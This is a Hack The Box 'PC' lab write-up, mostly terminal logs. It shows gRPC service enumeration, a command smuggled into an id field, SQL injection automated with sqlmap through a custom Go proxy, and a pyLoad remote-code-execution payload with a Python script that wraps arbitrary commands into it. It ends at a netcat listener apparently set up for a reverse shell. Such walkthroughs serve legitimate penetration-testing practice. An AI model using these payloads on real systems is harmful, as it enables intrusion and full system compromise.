# 【Hack The Box】PC【WriteUp】

> 原文: https://www.ctfiot.com/136588.html
> ID: 136588


```
┌──(root㉿kali)-[~]
└─# rustscan -a 10.129.95.145 --top --ulimit 1500 
.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
 --------------------------------------
? https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 1500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.145:22
Open 10.129.95.145:50051
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 04:41 EDT
Initiating Ping Scan at 04:41
Scanning 10.129.95.145 [4 ports]
Completed Ping Scan at 04:41, 0.54s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:41
Completed Parallel DNS resolution of 1 host. at 04:41, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 04:41
Scanning 10.129.95.145 [2 ports]
Discovered open port 22/tcp on 10.129.95.145
Discovered open port 50051/tcp on 10.129.95.145
Completed SYN Stealth Scan at 04:41, 0.41s elapsed (2 total ports)
Nmap scan report for 10.129.95.145
Host is up, received echo-reply ttl 63 (0.43s latency).
Scanned at 2023-05-22 04:41:52 EDT for 0s

PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
50051/tcp open unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
 Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```



```
┌──(root㉿kali)-[~]
└─# go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
go: downloading github.com/fullstorydev/grpcurl v1.8.7
go: downloading github.com/jhump/protoreflect v1.12.0
go: downloading google.golang.org/grpc v1.48.0
go: downloading golang.org/x/net v0.0.0-20201021035429-f5854403a974
go: downloading google.golang.org/genproto v0.0.0-20200526211855-cb27e3aa2013
go: downloading github.com/envoyproxy/go-control-plane v0.10.2-0.20220325020618-49ff273808a1
go: downloading golang.org/x/sys v0.0.0-20210119212857-b64e53b001e4
go: downloading github.com/cncf/xds/go v0.0.0-20211011173535-cb28da3451f1
go: downloading github.com/cespare/xxhash/v2 v2.1.1
go: downloading github.com/cncf/udpa/go v0.0.0-20210930031921-04548b0d99d4
go: downloading github.com/envoyproxy/protoc-gen-validate v0.1.0
go: downloading golang.org/x/text v0.3.7
go: downloading golang.org/x/oauth2 v0.0.0-20200107190931-bf48bf16ab8d
go: downloading github.com/census-instrumentation/opencensus-proto v0.2.1
go: downloading cloud.google.com/go v0.56.0
```



```
┌──(root㉿kali)-[~]
└─# /root/go/bin/grpcurl -plaintext 10.129.95.145:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```



```
┌──(root㉿kali)-[~]
└─# go install github.com/ktr0731/evans@latest
go: downloading github.com/ktr0731/evans v0.10.11
go: downloading github.com/fatih/color v1.13.0
go: downloading github.com/mattn/go-colorable v0.1.13
go: downloading github.com/hashicorp/go-version v1.6.0
go: downloading github.com/ktr0731/go-multierror v0.0.0-20171204182908-b7773ae21874
go: downloading github.com/ktr0731/go-updater v0.1.6
go: downloading github.com/pkg/errors v0.9.1
go: downloading github.com/spf13/cobra v1.6.1
go: downloading github.com/spf13/pflag v1.0.5
go: downloading github.com/tj/go-spin v1.1.0
go: downloading golang.org/x/sync v0.1.0
go: downloading github.com/mattn/go-isatty v0.0.16
go: downloading github.com/pelletier/go-toml v1.9.5
go: downloading github.com/zchee/go-xdgbasedir v1.0.3
go: downloading github.com/k0kubun/pp v3.0.1+incompatible
go: downloading github.com/spf13/viper v1.14.0
go: downloading github.com/chzyer/readline v0.0.0-20180603132655-2972be24d48e
go: downloading github.com/ktr0731/go-prompt v0.2.4
go: downloading github.com/manifoldco/promptui v0.9.0
go: downloading github.com/jhump/protoreflect v1.14.0
go: downloading google.golang.org/grpc v1.51.0
go: downloading github.com/hashicorp/errwrap v1.0.0
go: downloading github.com/google/go-github v17.0.0+incompatible
go: downloading github.com/inconshreveable/go-update v0.0.0-20160112193335-8152e7eb6ccf
go: downloading github.com/mattn/go-pipeline v0.0.0-20170920030317-cfb87a531e2b
go: downloading golang.org/x/sys v0.5.0
go: downloading github.com/golang/protobuf v1.5.2
go: downloading google.golang.org/protobuf v1.28.1
go: downloading google.golang.org/genproto v0.0.0-20221024183307-1bc688fe9f3e
go: downloading github.com/hashicorp/go-multierror v1.1.1
go: downloading github.com/ktr0731/grpc-web-go-client v0.2.8
go: downloading github.com/olekukonko/tablewriter v0.0.5
go: downloading github.com/ktr0731/go-shellstring v0.1.3
go: downloading github.com/mitchellh/go-homedir v1.1.0
go: downloading github.com/fsnotify/fsnotify v1.6.0
go: downloading github.com/mitchellh/mapstructure v1.5.0
go: downloading github.com/spf13/afero v1.9.2
go: downloading github.com/spf13/cast v1.5.0
go: downloading github.com/spf13/jwalterweatherman v1.1.0
go: downloading github.com/mattn/go-runewidth v0.0.13
go: downloading golang.org/x/net v0.7.0
go: downloading github.com/google/go-querystring v1.1.0
go: downloading go.uber.org/atomic v1.9.0
go: downloading golang.org/x/text v0.7.0
go: downloading github.com/subosito/gotenv v1.4.1
go: downloading github.com/hashicorp/hcl v1.0.0
go: downloading gopkg.in/ini.v1 v1.67.0
go: downloading github.com/magiconair/properties v1.8.6
go: downloading github.com/pelletier/go-toml/v2 v2.0.5
go: downloading gopkg.in/yaml.v3 v3.0.1
go: downloading github.com/pkg/term v1.2.0-beta.2
go: downloading github.com/rivo/uniseg v0.2.0
go: downloading github.com/gorilla/websocket v1.5.0
```



```
┌──(root㉿kali)-[~/work]
└─# /root/go/bin/evans --host 10.129.95.145 -p 50051 -r 

 ______
 | ____|
 | |__ __ __ __ _ _ __ ___
 | __| \ \ / / / _. | | '_ \ / __|
 | |____ \ V / | (_| | | | | | \__ \
 |______| \_/ \__,_| |_| |_| |___/

 more expressive universal gRPC client

SimpleApp@10.129.95.145:50051>
```



```
SimpleApp@10.129.95.145:50051> show service
+-----------+--------------+---------------------+----------------------+
| SERVICE | RPC | REQUEST TYPE | RESPONSE TYPE |
+-----------+--------------+---------------------+----------------------+
| SimpleApp | LoginUser | LoginUserRequest | LoginUserResponse |
| SimpleApp | RegisterUser | RegisterUserRequest | RegisterUserResponse |
| SimpleApp | getInfo | getInfoRequest | getInfoResponse |
+-----------+--------------+---------------------+----------------------+
```



```
SimpleApp@10.129.95.145:50051> desc LoginUserRequest
+----------+-------------+----------+
| FIELD | TYPE | REPEATED |
+----------+-------------+----------+
| password | TYPE_STRING | false |
| username | TYPE_STRING | false |
+----------+-------------+----------+

SimpleApp@10.129.95.145:50051> desc getInfoRequest
+-------+-------------+----------+
| FIELD | TYPE | REPEATED |
+-------+-------------+----------+
| id | TYPE_STRING | false |
+-------+-------------+----------+

SimpleApp@10.129.95.145:50051> desc getInfoResponse
+---------+-------------+----------+
| FIELD | TYPE | REPEATED |
+---------+-------------+----------+
| message | TYPE_STRING | false |
+---------+-------------+----------+
```



```
SimpleApp@10.129.95.145:50051> call LoginUser
username (TYPE_STRING) => admin
password (TYPE_STRING) => admin
{
 "message": "Your id is 834."
}
```



```
SimpleApp@10.129.95.145:50051> call RegisterUser
username (TYPE_STRING) => testuser
password (TYPE_STRING) => testuser
{
 "message": "Account created for user testuser!"
}
```



```
SimpleApp@10.129.95.145:50051> call LoginUser --enrich
username (TYPE_STRING) => testuser
password (TYPE_STRING) => testuser
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

{
 "message": "Your id is 22."
}

token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE2ODQ3NjE4NTR9.R0OMI2PN0Sfd5PRpcQuTY3eey3ifESu2RMh9e_PiKVg'

code: OK
number: 0
message: ""
```



```
SimpleApp@10.129.95.145:50051> header token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE2ODQ3NjE4NTR9.R0OMI2PN0Sfd5PRpcQuTY3eey3ifESu2RMh9e_PiKVg
```



```
SimpleApp@10.129.95.145:50051> 
SimpleApp@10.129.95.145:50051> call getInfo
id (TYPE_STRING) => 327
command call: rpc error: code = Unknown desc = Unexpected <class 'TypeError'>: 'NoneType' object is not subscriptable
```



```
SimpleApp@10.129.95.145:50051> call LoginUser --enrich
username (TYPE_STRING) => testuser
password (TYPE_STRING) => testuser
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

{
 "message": "Your id is 562."
}

token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHUiLCJleHAiOjE2ODQ3NzIwNzJ9.t-WhNtgQY_muLAQvf31iibh9qXqTBwD4rxBG9v0xNj8'

code: OK
number: 0
message: ""

SimpleApp@10.129.95.145:50051> header token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHUiLCJleHAiOjE2ODQ3NzIwNzJ9.t-WhNtgQY_muLAQvf31iibh9qXqTBwD4rxBG9v0xNj8
```



```
SimpleApp@10.129.95.145:50051> call getInfo --enrich
id (TYPE_STRING) => 562
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

{
 "message": "Will update soon."
}

code: OK
number: 0
message: ""
```



```
SimpleApp@10.129.95.145:50051> call RegisterUser
username (TYPE_STRING) => testu
password (TYPE_STRING) => testu
{
 "message": "Account created for user testu!"
}

SimpleApp@10.129.95.145:50051> call LoginUser --enrich
username (TYPE_STRING) => testu
password (TYPE_STRING) => testu
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

{
 "message": "Your id is 425."
}

token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHUiLCJleHAiOjE2ODQ3NzI0MTd9.DfVyzGde6IjLfxgin65F7aAaplqMxJ0jteB6CQtVaVo'

code: OK
number: 0
message: ""

SimpleApp@10.129.95.145:50051> header token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHUiLCJleHAiOjE2ODQ3NzI0MTd9.DfVyzGde6IjLfxgin65F7aAaplqMxJ0jteB6CQtVaVo

SimpleApp@10.129.95.145:50051> call getInfo
id (TYPE_STRING) => 425;ping -c 3 10.10.14.55
command call: rpc error: code = Unknown desc = Unexpected <class 'sqlite3.Warning'>: You can only execute one statement at a time.
```



```
SimpleApp@10.129.95.145:50051> call RegisterUser
username (TYPE_STRING) => aaaa
password (TYPE_STRING) => aaaa
{
 "message": "Account created for user aaaa!"
}

SimpleApp@10.129.95.145:50051> call LoginUser --enrich
username (TYPE_STRING) => aaaa
password (TYPE_STRING) => aaaa
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

{
 "message": "Your id is 611."
}

token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWFhYSIsImV4cCI6MTY4NDc4MDU0M30.l1k6g6ds9iYtAmsiIO7geihyDmlaCTZzDMHSkBOGLz4'

code: OK
number: 0
message: ""

SimpleApp@10.129.95.145:50051> header token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWFhYSIsImV4cCI6MTY4NDc4MDU0M30.l1k6g6ds9iYtAmsiIO7geihyDmlaCTZzDMHSkBOGLz4

SimpleApp@10.129.95.145:50051> call getInfo
id (TYPE_STRING) => 611 Union select sqlite_version();
{
 "message": "3.31.1"
}
```



```
package main

import (
	"encoding/json"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

type Request struct {
	ID string `json:"id"`
}

type Response struct {
	Message string `json:"message"`
}

const (
	hostname = "10.129.93.227:50051" // ホスト名とポートを指定
	serviceName = "SimpleApp" // サービス名を指定
	methodName = "getInfo" // メソッド名を指定
	tokenHeader = "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWFhYSIsImV4cCI6MTY4NDg2MTExOX0.8dyUoaB562MTJk-wznf39-HiaVjmlwhGVtY7YRzNb2k"
	httpPort = ":8051" // HTTPのポート番号を指定
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 // GETメソッドのクエリパラメータを取得
 queryID := r.URL.Query().Get("id")

 // JSON形式のリクエストボディを作成
 reqBody, err := json.Marshal(Request{ID: queryID})
 if err != nil {
 log.Printf("Error marshaling request body: %v", err)
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }

 // HTTPリクエストをgRPCリクエストに変換して転送する
 cmd := exec.Command("grpcurl", "--plaintext", "--rpc-header", tokenHeader, "-d", string(reqBody), hostname, serviceName+"."+methodName)
 output, err := cmd.Output()
 if err != nil {
 log.Printf("Error executing grpcurl: %v", err)
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }

 resp := string(output)
 if strings.HasPrefix(resp, "ERROR:") {
 // エラーレスポンスの場合はそのまま返す
 http.Error(w, resp, http.StatusInternalServerError)
 return
 }

 // レスポンスをパースしてJSONの中身を取得
 var response Response
 err = json.Unmarshal([]byte(resp), &response)
 if err != nil {
 log.Printf("Error unmarshaling response body: %v", err)
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }

 // JSONの中身をレスポンスとして返す
 w.Header().Set("Content-Type", "application/json")
 json.NewEncoder(w).Encode(response)
	})

	// HTTPサーバーを起動
	log.Println("HTTP to gRPC proxy server started on", httpPort)
	log.Fatal(http.ListenAndServe(httpPort, nil))
}
```



```
┌──(root㉿kali)-[~]
└─# go mod init sqlmap/grpc
```



```
┌──(root㉿kali)-[~]
└─# go mod tidy
```



```
┌──(root㉿kali)-[~]
└─# go run http2grpc.go
```



```
┌──(root㉿kali)-[~]
└─# sqlmap -u "http://localhost:8051/?id=1" --batch --level 5 --risk 3 --dbms=sqlite --dump
 ___
 __H__ 
 ___ ___[)]_____ ___ ___ {1.7.2#stable} 
|_ -| . ['] | .'| . | 
|___|_ [)]_|_|_|__,| _| 
 |_|V... |_| https://sqlmap.org 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:13:44 /2023-05-23/

[10:13:44] [INFO] testing connection to the target URL
[10:13:46] [INFO] testing if the target URL content is stable
[10:13:47] [INFO] target URL content is stable
[10:13:47] [INFO] testing if GET parameter 'id' is dynamic
[10:13:49] [WARNING] GET parameter 'id' does not appear to be dynamic
[10:13:50] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[10:13:51] [INFO] testing for SQL injection on GET parameter 'id'
[10:13:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:14:08] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[10:14:08] [INFO] testing 'Generic inline queries'
[10:14:10] [INFO] testing 'SQLite inline queries'
[10:14:12] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[10:14:12] [WARNING] time-based comparison requires larger statistical model, please wait.............. (done) 
[10:14:37] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[10:14:39] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[10:14:43] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[10:14:47] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[10:14:51] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[10:15:01] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
[10:15:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:15:05] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:15:10] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:15:18] [INFO] target URL appears to have 1 column in query
[10:15:22] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:

...省略
```



```
sau@pc:~$ sudo -l
[sudo] password for sau: 
Sorry, user sau may not run sudo on localhost.
```



```
┌──(root㉿kali)-[~/work]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```



```
sau@pc:~$ chmod +x ./pspy64 
sau@pc:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

 ██▓███ ██████ ██▓███ ▓██ ██▓
 ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒
 ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░
 ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
 ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░
 ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ 
 ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ 
 ░░ ░ ░ ░ ░░ ▒ ▒ ░░ 
 ░ ░ ░ 
 ░ ░ 

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/05/23 14:32:51 CMD: UID=1001 PID=1977 | ./pspy64 
2023/05/23 14:32:51 CMD: UID=0 PID=1976 | 
2023/05/23 14:32:51 CMD: UID=0 PID=1936 | 
2023/05/23 14:32:51 CMD: UID=1001 PID=1925 | -bash 
2023/05/23 14:32:51 CMD: UID=1001 PID=1919 | sshd: sau@pts/0 
2023/05/23 14:32:51 CMD: UID=0 PID=1818 | 
2023/05/23 14:32:51 CMD: UID=1001 PID=1815 | (sd-pam) 
2023/05/23 14:32:51 CMD: UID=1001 PID=1814 | /lib/systemd/systemd --user 
2023/05/23 14:32:51 CMD: UID=0 PID=1786 | sshd: sau [priv] 
2023/05/23 14:32:51 CMD: UID=0 PID=1599 | 
2023/05/23 14:32:51 CMD: UID=0 PID=1522 | 
2023/05/23 14:32:51 CMD: UID=0 PID=1411 | 
2023/05/23 14:32:51 CMD: UID=0 PID=1368 | 
2023/05/23 14:32:51 CMD: UID=0 PID=1045 | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2023/05/23 14:32:51 CMD: UID=1 PID=1037 | /usr/sbin/atd -f 
2023/05/23 14:32:51 CMD: UID=0 PID=1034 | /usr/sbin/cron -f 
2023/05/23 14:32:51 CMD: UID=0 PID=1031 | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2023/05/23 14:32:51 CMD: UID=0 PID=1018 | /usr/bin/python3 /usr/local/bin/pyload 
2023/05/23 14:32:51 CMD: UID=0 PID=1013 | /usr/bin/python3 /opt/app/app.py 
2023/05/23 14:32:51 CMD: UID=101 PID=954 | /lib/systemd/systemd-resolved 
2023/05/23 14:32:51 CMD: UID=0 PID=835 | /usr/sbin/ModemManager 
2023/05/23 14:32:51 CMD: UID=0 PID=808 | /usr/lib/udisks2/udisksd 
2023/05/23 14:32:51 CMD: UID=0 PID=807 | /lib/systemd/systemd-logind 
2023/05/23 14:32:51 CMD: UID=0 PID=806 | /usr/lib/snapd/snapd 
2023/05/23 14:32:51 CMD: UID=104 PID=805 | /usr/sbin/rsyslogd -n -iNONE 
2023/05/23 14:32:51 CMD: UID=0 PID=804 | /usr/lib/policykit-1/polkitd --no-debug 
2023/05/23 14:32:51 CMD: UID=0 PID=803 | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2023/05/23 14:32:51 CMD: UID=0 PID=801 | /usr/sbin/irqbalance --foreground 
2023/05/23 14:32:51 CMD: UID=103 PID=796 | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2023/05/23 14:32:51 CMD: UID=0 PID=794 | /usr/lib/accountsservice/accounts-daemon 
2023/05/23 14:32:51 CMD: UID=0 PID=774 | 
2023/05/23 14:32:51 CMD: UID=0 PID=756 | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
2023/05/23 14:32:51 CMD: UID=0 PID=730 | /usr/bin/vmtoolsd 
2023/05/23 14:32:51 CMD: UID=0 PID=729 | /usr/bin/VGAuthService 
2023/05/23 14:32:51 CMD: UID=0 PID=709 | /sbin/auditd 
2023/05/23 14:32:51 CMD: UID=0 PID=690 | 
2023/05/23 14:32:51 CMD: UID=0 PID=689 | 
2023/05/23 14:32:51 CMD: UID=0 PID=688 | 
2023/05/23 14:32:51 CMD: UID=0 PID=678 | /sbin/multipathd -d -s 
2023/05/23 14:32:51 CMD: UID=0 PID=677 | 
2023/05/23 14:32:51 CMD: UID=0 PID=676 | 
2023/05/23 14:32:51 CMD: UID=0 PID=675 | 
2023/05/23 14:32:51 CMD: UID=0 PID=674 | 
2023/05/23 14:32:51 CMD: UID=100 PID=525 | /lib/systemd/systemd-networkd 
2023/05/23 14:32:51 CMD: UID=0 PID=506 | /lib/systemd/systemd-udevd 
2023/05/23 14:32:51 CMD: UID=0 PID=486 | bpfilter_umh 
2023/05/23 14:32:51 CMD: UID=0 PID=463 | /lib/systemd/systemd-journald 
2023/05/23 14:32:51 CMD: UID=0 PID=439 | 
2023/05/23 14:32:51 CMD: UID=0 PID=403 | 
2023/05/23 14:32:51 CMD: UID=0 PID=402 | 
2023/05/23 14:32:51 CMD: UID=0 PID=359 | 
2023/05/23 14:32:51 CMD: UID=0 PID=331 | 
2023/05/23 14:32:51 CMD: UID=0 PID=329 | 
2023/05/23 14:32:51 CMD: UID=0 PID=328 | 
2023/05/23 14:32:51 CMD: UID=0 PID=299 | 
2023/05/23 14:32:51 CMD: UID=0 PID=298 | 
2023/05/23 14:32:51 CMD: UID=0 PID=297 | 
2023/05/23 14:32:51 CMD: UID=0 PID=296 | 
2023/05/23 14:32:51 CMD: UID=0 PID=295 | 
2023/05/23 14:32:51 CMD: UID=0 PID=294 | 
2023/05/23 14:32:51 CMD: UID=0 PID=293 | 
2023/05/23 14:32:51 CMD: UID=0 PID=292 | 
2023/05/23 14:32:51 CMD: UID=0 PID=291 | 
2023/05/23 14:32:51 CMD: UID=0 PID=290 | 
2023/05/23 14:32:51 CMD: UID=0 PID=289 | 
2023/05/23 14:32:51 CMD: UID=0 PID=288 | 
2023/05/23 14:32:51 CMD: UID=0 PID=287 | 
2023/05/23 14:32:51 CMD: UID=0 PID=286 | 
2023/05/23 14:32:51 CMD: UID=0 PID=285 | 

...省略
```



```
sau@pc:~$ netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address Foreign Address State 
tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 
tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN 
tcp 0 0 0.0.0.0:9666 0.0.0.0:* LISTEN 
tcp 0 244 10.129.93.227:22 10.10.14.97:40542 ESTABLISHED
tcp6 0 0 :::22 :::* LISTEN 
tcp6 0 0 :::50051 :::* LISTEN 
udp 0 0 127.0.0.53:53 0.0.0.0:* 
udp 0 0 0.0.0.0:68 0.0.0.0:*
```



```
┌──(root㉿kali)-[~/work/go]
└─# ssh -L 8888:127.0.0.1:8000 sau@10.129.93.227
sau@10.129.93.227's password: 
Last login: Tue May 23 14:19:36 2023 from 10.10.14.97
sau@pc:~$ 
sau@pc:~$
```



```
curl -i -s -k -X $'POST' \
 -H $'Host: 127.0.0.1:8888' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
 --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
 $'http://127.0.0.1:8888/flash/addcrypted2'
```



```
sau@pc:/tmp$ ls -lta
total 60
drwxrwxrwt 15 root root 4096 May 23 15:34 .
-rw-r--r-- 1 root root 0 May 23 14:48 pwnd
drwx------ 2 sau sau 4096 May 23 14:34 tmpj8bo1dnt
drwx------ 2 root root 4096 May 23 10:32 vmware-root_730-2999460803
drwxr-xr-x 4 root root 4096 May 23 10:31 pyLoad
drwx------ 2 root root 4096 May 23 10:31 tmp0x7zev2m
drwx------ 3 root root 4096 May 23 10:31 snap-private-tmp
drwx------ 3 root root 4096 May 23 10:31 systemd-private-eacc7f50a01e4cb1b05c81d7e3495443-systemd-resolved.service-k0Ag6g
drwx------ 3 root root 4096 May 23 10:31 systemd-private-eacc7f50a01e4cb1b05c81d7e3495443-ModemManager.service-cxfurj
drwx------ 3 root root 4096 May 23 10:31 systemd-private-eacc7f50a01e4cb1b05c81d7e3495443-systemd-logind.service-5wLqEg
drwxrwxrwt 2 root root 4096 May 23 10:31 .ICE-unix
drwxrwxrwt 2 root root 4096 May 23 10:31 .Test-unix
drwxrwxrwt 2 root root 4096 May 23 10:31 .X11-unix
drwxrwxrwt 2 root root 4096 May 23 10:31 .XIM-unix
drwxrwxrwt 2 root root 4096 May 23 10:31 .font-unix
drwxr-xr-x 21 root root 4096 Apr 27 15:23 ..
```



```
import sys

def urlencode(string):
 urlencode = ""
 
 for char in string:
 decimal = ord(char)
 urlencode += "%" + hex(decimal)[2:]
 
 return urlencode
 
encode=urlencode(sys.argv[1])
print(encode)
print("\n")

curl_cmd = f"curl -i -s -k -X $'POST' -H $'Host: 127.0.0.1:8888' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22{encode}%22%29;f=function%20f2(){{}};&passwords=aaaa' $'http://127.0.0.1:8888/flash/addcrypted2'"
 
print(curl_cmd)
```



```
┌──(root?kali)-[~/work]
└─# nc -lnvp 4444 
listening on [any] 4444 ...
```
